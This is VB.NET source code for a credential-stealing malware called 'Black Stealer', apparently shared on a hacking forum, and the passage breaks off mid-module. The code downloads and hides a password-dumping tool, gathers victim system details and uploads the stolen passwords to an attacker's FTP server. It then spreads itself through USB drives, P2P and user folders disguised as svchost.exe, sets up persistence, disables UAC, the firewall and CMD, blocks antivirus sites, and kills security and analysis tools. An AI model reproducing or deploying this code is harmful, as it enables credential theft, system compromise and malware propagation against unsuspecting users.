Imports System.IO
Imports Microsoft.Win32
Imports System.Runtime.InteropServices
Imports System.Runtime.CompilerServices
Imports System.Globalization
Imports System.Security.Cryptography
Imports System.Text
Imports System.Data
Imports System.Collections
Imports System.Collections.Generic
Imports Microsoft.Win32.SafeHandles
Imports System.ComponentModel
' -----------------------
' Black Stealer [ Legend Edition ]
' Last Update : 12/7/1435
' Gift For : WwW.DeV-PoInT.CoM
' Coded By : Black.Hacker
' -----------------------
Module Module1
    Public Host1 As String = "[Host]"
    Public Username1 As String = "[User]"
    Public Password As String = "[Password]"
    Public EncryptionPassword As String = "[Encryption Password]"
    Public ToolURL As String = "[ToolURL]"
    Public ToolName As String = "[ToolName]"
    Public USB As String = "[USB]"
    Public P2Pp As String = "[P2P]"
    Public Folders As String = "[Folders]"
    Public Shareda As String = "[Shared]"
    Public CMD As String = "[Cmd]"
    Public FireWall As String = "[FireWall]"
    Public Meltf As String = "[Melt]"
    Public StartUP As String = "[Startup]"
    Public UAC As String = "[UAC]"
    Public KeyScam As String = "[KeyScrambler]"
    Public ApateDNNS As String = "[apateDNS]"
    Public WsWhark As String = "[Wireshark]"
    Public AVSite As String = "[AVSite]"
    Public SandBix As String = "[Sandboxie]"
    Public BSOD1 As String = "[BSOD]"
    Public HideRun As String = "[HideAfterRun]"
    Public SpyTheSpy As String = "[SpyTheSpy]"
    Public TCPView As String = "[TCPView]"
    Public Sleep As String = "[Sleep]"
    Public Reflocter As String = "[Reflocter]"
    Public IPBlock As String = "[IPBlocker]"
    Public TiFW As String = "[TigerFW]"
    Public MBMM As String = "[mbmm]"
    Public BypassVM As String = "[BypassVM]"
    Public ErrorMsg As String = "[ErrorMsg]"
    Public HideProcess As String = "[HideProcess]"
    Public KillNoIP As String = "[Kill No-IP]"
    Public exen As String = New IO.FileInfo(Application.ExecutablePath).Name
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1) ' متغير محفوظ فيه اسم الدوله
    Sub Main()
        On Error Resume Next
        Dim client As New System.Net.WebClient
        Dim IPa As String = client.DownloadString("http://checkip.dyndns.org/")
        IPa = Split(IPa, ":")(1) : IPa = Split(IPa, "<")(0)
        If File.Exists(Environ("tmp" & "\" & ToolName)) Then
            Shell(Environ("tmp") & "\" & ToolName & " /stext " & Environ("tmp") & "\pass.txt", AppWinStyle.Hide)
            File.WriteAllText(Environ("tmp") & "\BlackStealer.txt", "= = = = = = Black Stealer v2.1 [ Legend Edition ] | Coded By : Black.Hacker = = = = = =" & vbNewLine & "+ + + [ VicTim Info ] + + +" & vbNewLine & "-Operating System : " & My.Computer.Info.OSFullName & vbNewLine & "-AntiVirus : " & GetAV() & vbNewLine & "-VicTim IP : " & IPa & vbNewLine & "-Last Date : " & DateTime.Now.ToString("yyyy/MM/dd") & vbNewLine & "-Computer Name : " & Environment.MachineName & vbNewLine & "-Browser : " & getDefaultBrowser() & vbNewLine & "-Country : " & country & vbNewLine & File.ReadAllText(Environ("tmp") & "\pass.txt", System.Text.Encoding.Default) & vbNewLine & " = = = = = = End Stealer = = = = = =")
        Else
            Dim cd As New System.Net.WebClient
            cd.DownloadFile(ToolURL, Environ("tmp") & "\" & ToolName)
            IO.File.SetAttributes(Environ("tmp") & "\" & ToolName, FileAttributes.Hidden + FileAttributes.System)
            Shell(Environ("tmp") & "\" & ToolName & " /stext " & Environ("tmp") & "\pass.txt", AppWinStyle.Hide)
            File.WriteAllText(Environ("tmp") & "\BlackStealer.txt", "= = = = = = Black Stealer v2.1 [ Legend Edition ] | Coded By : Black.Hacker = = = = = =" & vbNewLine & "+ + + [ VicTim Info ] + + +" & vbNewLine & "-Operating System : " & My.Computer.Info.OSFullName & vbNewLine & "-AntiVirus : " & GetAV() & vbNewLine & "-VicTim IP : " & IPa & vbNewLine & "-Last Date : " & DateTime.Now.ToString("yyyy/MM/dd") & vbNewLine & "-Computer Name : " & Environment.MachineName & vbNewLine & "-Browser : " & getDefaultBrowser() & vbNewLine & "-Country : " & country & vbNewLine & File.ReadAllText(Environ("tmp") & "\pass.txt", System.Text.Encoding.Default) & vbNewLine & " = = = = = = End Stealer = = = = = =")
        End If
        System.Threading.Thread.Sleep(Sleep)
        My.Computer.Network.UploadFile(Environ("tmp") & "\BlackStealer.txt", "ftp://" & XORDecryption(EncryptionPassword, Host1) & "/Black Stealer - " & Randomisi(10) & ".txt", XORDecryption(EncryptionPassword, Username1), XORDecryption(EncryptionPassword, Password))
        ' - - - - - - - - - - - - - - - - - -
        ' كود مسح الأثر
        ' - - - - - - - - - - - - - - - - - -
        IO.File.Delete(Environ("tmp") & "\" & ToolName)
        IO.File.Delete(Environ("tmp") & "\" & "BlackStealer.txt")
        IO.File.Delete(Environ("tmp") & "\" & "pass.txt")
        Kill(Environ("tmp") & "\" & "pass.txt")
        Kill(Environ("tmp") & "\" & "BlackStealer.txt")
        Kill(Environ("tmp") & "\" & ToolName)
        '- - - - - - - - - - - - - - - - - -
        If USB = "True" Then
            Dim c As New USB
            c.Start()
        End If
        If Folders = "True" Then
            Call getFolders("C:\Users\" & Environment.UserName & "\")
            Call getFolders("C:\Users\" & Environment.UserName & "\Desktop\")
            Call getFolders("C:\Users\" & Environment.UserName & "\Documents\")
        End If
        If P2Pp = "True" Then
            Call p2p()
        End If
        If Shareda = "True" Then
            Call Shared1()
        End If
        If Meltf = "True" Then
            Call Melt()
        End If
        If StartUP = "True" Then
            If Meltf = "True" Then
                AStartup(StartUP, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & "svchost.exe")
            Else
                AStartup(StartUP, Application.ExecutablePath)
            End If
            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe") Then
                ' Nothing
            Else
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe")
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe", FileAttributes.Hidden + FileAttributes.System)
            End If
        End If
        If UAC = "True" Then
            Call UACD()
        End If
        If CMD = "True" Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
        End If
        If KeyScam = "True" Then
            Call Keyss()
        End If
        If ApateDNNS = "True" Then
            Call ApteDNS()
        End If
        If WsWhark = "True" Then
            Call Wshark()
        End If
        If SandBix = "True" Then
            Call SindebOx()
        End If
        If SpyTheSpy = "True" Then
            Call SpySpy()
        End If
        If TCPView = "True" Then
            Call TCPV()
        End If
        If TiFW = "True" Then
            Call TigerFW()
        End If
        If Reflocter = "True" Then
            Call Refloct()
        End If
        If MBMM = "True" Then
            Call MbMM2()
        End If
        If IPBlock = "True" Then
            Call IPBlocker()
        End If
        If HideProcess Then
            TMListViewDelete.Running = True
        End If
        If BypassVM = "True" Then
            Call DE()
        End If
        If ErrorMsg = "True" Then
            MsgBox("The application failed to initialize properly (0x0000022). Click on OK to terminate the application.", MsgBoxStyle.Critical, exen & " - Application Error")
        End If
        If KillNoIP = "True" Then
            Call KillMyNoIp()
        End If
        If BSOD1 = "True" Then
            pr(1)
        End If
        If HideRun = "True" Then
            IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
        End If
        If AVSite = "True" Then
            My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", "127.0.0.1" + "  " + "www.virustotal.com" + vbNewLine, True)
            My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", "127.0.0.1" + "  " + "anubis.iseclab.org" + vbNewLine, True)
            My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", "127.0.0.1" + "  " + "www.virscan.org" + vbNewLine, True)
            My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", "127.0.0.1" + "  " + "virusscan.jotti.org" + vbNewLine, True)
            My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", "127.0.0.1" + "  " + "scanner.virus.org" + vbNewLine, True)
            My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", "127.0.0.1" + "  " + "scanner.novirusthanks.org" + vbNewLine, True)
            My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", "127.0.0.1" + "  " + "metascan-online.com" + vbNewLine, True)
        End If
        If FireWall = "True" Then
            Call Bypass.FirfeWall()
        End If
        End
    End Sub
    Public Function DE() As Boolean
        'c0ded bY : security.najaf :)
        Using M = New System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem")
            Using I = M.Get()
                For Each T In I
                    Dim A As String = T("Manufacturer").ToString().ToLower()
                    If A = "microsoft corporation" OrElse A.Contains("vmware") OrElse T("Model").ToString() = "VirtualBox" Then
                        MessageBox.Show("Warning!!! Was detected using delusional environment", "", MessageBoxButtons.OK, MessageBoxIcon.Stop)
                        End
                    End If
                Next T
            End Using
        End Using
        Return False
    End Function
    Public Sub KillMyNoIp()
        Dim process As Process
        For Each process In process.GetProcessesByName("DUC30")
            process.Kill()
        Next
        Dim process2 As Process
        For Each process2 In process.GetProcessesByName("DUC20")
            process2.Kill()
        Next
    End Sub
    Public Function XORDecryption(ByVal CodeKey As String, ByVal DataIn As String) As String
        Dim lonDataPtr As Long
        Dim strDataOut As String
        Dim intXOrValue1 As Integer
        Dim intXOrValue2 As Integer
        For lonDataPtr = 1 To (Len(DataIn) / 2)
            intXOrValue1 = Val("&H" & (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
            intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
            strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
        Next lonDataPtr
        XORDecryption = strDataOut
    End Function
        Private Function getDefaultBrowser() As String
        Dim retVal As String = String.Empty
        Using baseKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Clients\StartmenuInternet")
            Dim baseName As String = baseKey.GetValue("").ToString
            Dim subKey As String = "SOFTWARE\" & IIf(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") = "AMD64", "Wow6432Node\", "") & "Clients\StartMenuInternet\" & baseName
            Using browserKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey(subKey)
                retVal = browserKey.GetValue("").ToString
            End Using
        End Using
        Return retVal
    End Function
    Sub IPBlocker()
        Dim Security14() As Process = System.Diagnostics.Process.GetProcessesByName("IPBlocker")
        For Each Najaf14 As Process In Security14
            Najaf14.Kill()
        Next
    End Sub
    Sub MbMM2()
        Dim Security10() As Process = System.Diagnostics.Process.GetProcessesByName("mbam")
        For Each Najaf10 As Process In Security10
            Najaf10.Kill()
        Next
        For Each proc As Process In Process.GetProcesses
            If proc.MainWindowTitle.Contains("Malwarebytes Anti-Malware") Then
                proc.Kill()
            End If
        Next
    End Sub
    Sub Refloct()
        For Each proc As Process In Process.GetProcesses
            If proc.MainWindowTitle.Contains(".NET Reflector") Then
                proc.Kill()
            End If
        Next
        Dim Security27() As Process = System.Diagnostics.Process.GetProcessesByName("Reflector")
        For Each Najaf27 As Process In Security27
            Najaf27.Kill()
        Next
    End Sub
    Sub TigerFW()
        Dim Security18() As Process = System.Diagnostics.Process.GetProcessesByName("TiGeR-Firewall")
        For Each Najaf18 As Process In Security18
            Najaf18.Kill()
        Next
    End Sub
    Public Function GetAV() As String
        '' By AFHJQ
        Dim AV As String
        Dim fir As Integer
        Try
            Dim Sec As Integer
            Dim Thr As Integer
one:
            Thr = 1
            Dim obj4 As Object = "Select * From AntiVirusProduct"
two:
            Thr = 2
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\.\root\SecurityCenter2", Nothing))
thr:
            Thr = 3
            Dim arguments As Object() = New Object() {RuntimeHelpers.GetObjectValue(obj4)}
            Dim copyBack As Boolean() = New Boolean() {True}
            If copyBack(0) Then
                obj4 = RuntimeHelpers.GetObjectValue(arguments(0))
            End If
            Dim Obf As Object = RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(objectValue, Nothing, "ExecQuery", arguments, Nothing, Nothing, copyBack))
tori:
            Thr = 4
            Dim enumerator As IEnumerator = DirectCast(Obf, IEnumerable).GetEnumerator
            Do While enumerator.MoveNext
                Dim instance As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
fiv:

                Sec = 1
sx:
                Thr = 6
                AV = Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(instance, Nothing, "displayName", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString
                GoTo Label_015D
sve:
                Thr = 7
            Loop
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
nime:
            Thr = 8
            AV = "Couldn´t detect AV"
            GoTo Label_015D
ly:
            fir = 0
            Select Case (fir + 1)
                Case 1
                    GoTo one
                Case 2
                    GoTo two
                Case 3
                    GoTo thr
                Case 4
                    GoTo tori
                Case 5
                    GoTo fiv
                Case 6
                    GoTo sx
                Case 7
                    GoTo sve
                Case 8
                    GoTo nime
                Case 9
                    GoTo Label_015D
                Case Else
                    GoTo Label_0152
            End Select
Label_011B:
            fir = Thr
            Select Case Sec
                Case 0
                    GoTo Label_0152
                Case 1
                    GoTo ly
            End Select
        Catch ex As Exception

            GoTo Label_011B
        End Try
Label_0152:

Label_015D:
        If (fir <> 0) Then

        End If
        Return AV

    End Function
    Public Function Randomisi(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    '======== process protect With BSOD
    <DllImport("ntdll")> _
    Public Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    Sub pr(ByVal i As Integer) ' protect process With BSOD
        ' if i= 0  Unprotect, if i=1 Protect
        Try
            NtSetInformationProcess(Process.GetCurrentProcess.Handle, 29, i, 4)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ED() ' unprotect me if windows restart or logoff
        pr(0)
    End Sub
End Module

Module sss
    Public Sub Melt()
        IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft")
        If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & "svchost.exe" Then
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
            End If
        Else
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
            End If
            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & "svchost.exe") Then
                Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & "svchost.exe") : Catch : End Try
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & "svchost.exe")
                IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & "svchost.exe")
                End
            Else
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & "svchost.exe")
                IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & "svchost.exe")
                End
            End If
        End If
    End Sub
End Module
Module Folder_Spread
    Public Function getFolders(ByVal location) As String ' Ask for folders
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders = subdi.FullName
            If File.Exists(folders & "\" & "svchost.exe") Then
                IO.File.Delete(folders & "\" & "svchost.exe")
                IO.File.Copy(Application.ExecutablePath, folders & "\" & "svchost.exe")
                IO.File.SetAttributes(folders & "\" & "svchost.exe", FileAttributes.Hidden)
            Else
                IO.File.Copy(Application.ExecutablePath, folders & "\" & "svchost.exe")
                IO.File.SetAttributes(folders & "\" & "svchost.exe", FileAttributes.Hidden)
            End If
        Next
        Call filehide()
        Return folders
    End Function

End Module
Public Module Screening_Programs ' Bypassing 50 Screaning Programs Use MainWindowTitle + GetProcessesByName
    Public Sub SindebOx()
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
Bypass:
            Dim Security1() As Process = System.Diagnostics.Process.GetProcessesByName("SbieCtrl")
            For Each Najaf1 As Process In Security1
                Najaf1.Kill()
            Next
            Resume Bypass
        End If

    End Sub
    Public Sub SpySpy()
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
bypass:
            Dim Security2() As Process = System.Diagnostics.Process.GetProcessesByName("SpyTheSpy")
            For Each Najaf2 As Process In Security2
                Najaf2.Kill()
            Next
            Resume bypass
        End If

    End Sub
    Public Sub Wshark()
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
by:
            Dim Security9() As Process = System.Diagnostics.Process.GetProcessesByName("wireshark")
            For Each Najaf9 As Process In Security9
                Najaf9.Kill()
            Next
            Resume by

        End If

    End Sub
    Public Sub Keyss()
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
Bypass:
            Dim Security17() As Process = System.Diagnostics.Process.GetProcessesByName("KeyScrambler")
            For Each Najaf17 As Process In Security17
                Najaf17.Kill()
            Next
            Resume Bypass
        End If

    End Sub
    Public Sub TCPV()
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
Bypass:
            Dim Security19() As Process = System.Diagnostics.Process.GetProcessesByName("Tcpview")
            For Each Najaf19 As Process In Security19
                Najaf19.Kill()
            Next
            Resume Bypass
        End If
    End Sub
    Public Sub ApteDNS()
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
Bypass:
            Dim Security13() As Process = System.Diagnostics.Process.GetProcessesByName("apateDNS")
            For Each Najaf13 As Process In Security13
                Najaf13.Kill()
            Next
            Resume Bypass
        End If

    End Sub
End Module
Public Class USB
    ' bY njq8
    Private Off As Boolean = False
    Dim thread As Threading.Thread = Nothing
    Dim r As New Random
    Public ExeName As String = "svchost.exe"
    Public Sub Start()
        If thread Is Nothing Then
            thread = New Threading.Thread(AddressOf usb, 1)
            thread.Start()
        End If
    End Sub
    Public Sub clean()
        Off = True
        Do Until thread Is Nothing
            Threading.Thread.CurrentThread.Sleep(1)
        Loop
        For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
            Try
                If x.IsReady Then
                    If x.DriveType = IO.DriveType.Removable Or _
                    x.DriveType = IO.DriveType.CDRom Then
                        If IO.File.Exists(x.Name & ExeName) Then
                            IO.File.SetAttributes(x.Name _
                            & ExeName, IO.FileAttributes.Normal)
                            IO.File.Delete(x.Name & ExeName)
                        End If
                        For Each xx As String In IO.Directory.GetFiles(x.Name)
                            Try
                                IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                If xx.ToLower.EndsWith(".lnk") Then
                                    IO.File.Delete(xx)
                                End If
                            Catch ex As Exception
                            End Try
                        Next
                        For Each xx As String In IO.Directory.GetDirectories(x.Name)
                            Try
                                With New IO.DirectoryInfo(xx)
                                    .Attributes = IO.FileAttributes.Normal
                                End With
                            Catch ex As Exception
                            End Try
                        Next
                    End If
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub
    Sub usb()
        Off = False
        Do Until Off = True
            For Each x In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType _
                        .Removable Or x.DriveType = IO.DriveType.CDRom Then
                            Try
                                If IO.File.Exists(x.Name & ExeName) Then
                                    IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                End If
                                IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                For Each xx As String In IO.Directory.GetFiles(x.Name)
                                    If IO.Path.GetExtension(xx).ToLower <> ".lnk" And _
                                    xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                        IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                        With CreateObject("WScript.Shell").CreateShortcut _
                                        (x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                            .TargetPath = "cmd.exe"
                                            .WorkingDirectory = ""
                                            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                             & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx) _
                                            .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                            .IconLocation = GetIcon(IO.Path.GetExtension(xx))
                                            .Save()
                                        End With
                                    End If
                                Next
                                For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                    IO.File.Delete(x.Name & New IO.DirectoryInfo(xx).Name & " .lnk")
                                    With CreateObject("WScript.Shell") _
                                    .CreateShortcut(x.Name & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                        .TargetPath = "cmd.exe"
                                        .WorkingDirectory = ""
                                        .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                         & " " & ChrW(34)) & "&explorer /root,""%CD%" & New  _
                                         IO.DirectoryInfo(xx).Name & """ & exit"
                                        .IconLocation = "%SystemRoot%\system32\SHELL32.dll,3" '< folder icon
                                        .Save()
                                    End With
                                Next
                            Catch ex As Exception
                            End Try
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
            Threading.Thread.CurrentThread.Sleep(3000)
        Loop
        thread = Nothing
    End Sub
    Function GetIcon(ByVal ext As String) As String
        Try
            Dim r = Microsoft.Win32.Registry _
            .LocalMachine.OpenSubKey("Software\Classes\", False)
            Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
            .GetValue("") & "\DefaultIcon\").GetValue("", "")
            If e.Contains(",") = False Then e &= ",0"
            Return e
        Catch ex As Exception
            Return ""
        End Try
    End Function
End Class
Module Exta
    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public [me] As String = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName)
    Public Sub Shared1()
        Try
            Dim arSharedFolders As New ArrayList()
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Downloads") 'Spread the Server in "Downloaders"
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\My Shared Folder") 'Spread the Server in "My Shared Folder"
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Shared") 'Spread the Server in "Shared", etc....

            Dim folder As IEnumerator = arSharedFolders.GetEnumerator()
            While folder.MoveNext()
                Dim tada As String = Convert.ToString(folder.Current)
                If Directory.Exists(tada) Then
                    Dim progDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                    For Each d As String In Directory.GetDirectories(progDir)
                        Dim app As String = (tada & "\") + d.Substring(d.LastIndexOf("\")).Replace("\", String.Empty) & ".exe"
                        File.Copy([me], app, True)
                    Next
                End If
            End While
        Catch s As Exception
        End Try
    End Sub
    Public Sub p2p()
        Try
            Dim arSharedFolders As New ArrayList()
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Ares\My Shared Folder")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\Downloads")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\Shareaza\Downloads")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\emule\incoming\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\kazaa\my shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\kazaa lite\my shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\kazaa lite k++\my shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\icq\shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\grokster\my grokster\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\bearshare\shared\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\edonkey2000\incoming\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\morpheus\my shared folder\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\limewire\shared\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\tesla\files\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\winmx\shared\")
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Downloads") 'Spread the Server in "Downloaders"
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\My Shared Folder") 'Spread the Server in "My Shared Folder"
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Shared") 'Spread the Server in "Shared", etc....

            Dim folder As IEnumerator = arSharedFolders.GetEnumerator()
            While folder.MoveNext()
                Dim tada As String = Convert.ToString(folder.Current)
                If Directory.Exists(tada) Then
                    Dim progDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                    For Each d As String In Directory.GetDirectories(progDir)
                        Dim app As String = (tada & "\") + d.Substring(d.LastIndexOf("\")).Replace("\", String.Empty) & ".exe"
                        File.Copy([me], app, True)
                    Next
                End If
            End While
        Catch s As Exception
        End Try
    End Sub
    Public Sub filehide()
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 0)
    End Sub
    Public Sub UACD()
        If (My.Computer.Info.OSFullName.Contains("Vista") Or My.Computer.Info.OSFullName.Contains("7")) Then
            Try
                Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", True)
                If (key.GetValue("EnableLUA").ToString = "1") Then
                    key.SetValue("EnableLUA", "0")
                End If
            Catch x As Exception

            End Try
        End If
    End Sub
End Module
Module Bypass
    Public Sub FirfeWall()
        Dim process As New Process
        Dim str As String = "netsh.exe"
        process.StartInfo.Arguments = "firewall set opmode disable"
        process.StartInfo.FileName = str
        process.StartInfo.UseShellExecute = False
        process.StartInfo.RedirectStandardOutput = True
        process.StartInfo.CreateNoWindow = True
        process.Start()
        process.WaitForExit()
    End Sub
End Module
#Region " TMListViewDelete "

Module TMListViewDelete
#Region " Declarations/Functions/Consts "

    Private Const LVM_FIRST = &H1000
    Private Const LVM_DELETECOLUMN = LVM_FIRST + 28

    Private Const LVM_GETITEMCOUNT = (LVM_FIRST + 4)
    Private Const LVM_SORTITEMS = (LVM_FIRST + 48)
    Private Const LVM_DELETEITEM = (LVM_FIRST + 8)
    Private Const LVM_GETNEXTITEM = (LVM_FIRST + 12)
    Private Const LVM_GETITEM = (LVM_FIRST + 75)

    Private Delegate Function EnumDelegate(ByVal lngHwnd As IntPtr, ByVal lngLParam As Integer) As Integer
    Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal Hwnd As IntPtr, ByVal wMsg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    Private Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Function EnumChildWindows Lib "user32.dll" (ByVal hWndParent As IntPtr, ByVal lpEnumFunc As EnumDelegate, ByVal lParam As Integer) As Integer
    Declare Function GetClassName Lib "user32.dll" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
    Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hWnd As IntPtr, ByVal lpClassName As System.Text.StringBuilder, ByVal nMaxCount As Integer) As Integer
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As IntPtr) As Integer
    Dim t As New Timer

    Dim hwnd As IntPtr
    Dim controls As String
